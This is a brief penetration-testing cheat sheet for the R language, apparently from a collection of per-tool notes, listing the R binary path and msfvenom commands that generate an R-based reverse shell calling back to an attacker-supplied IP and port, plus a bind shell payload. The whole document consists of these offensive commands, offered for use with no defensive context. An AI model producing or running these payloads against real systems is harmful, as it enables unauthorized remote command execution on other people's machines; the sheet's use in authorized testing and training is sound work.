# Manual

## 01 - Common Files

```
/usr/bin/R
```

## 02 - Generate Payloads

### 2.1 - Reverse Shells

```
$ msfvenom -p cmd/unix/reverse_r lhost=<IP> lport=<PORT>
```

### 2.2 - Bind Shells

```
$ msfvenom -p cmd/unix/bind_r lport=<PORT>
```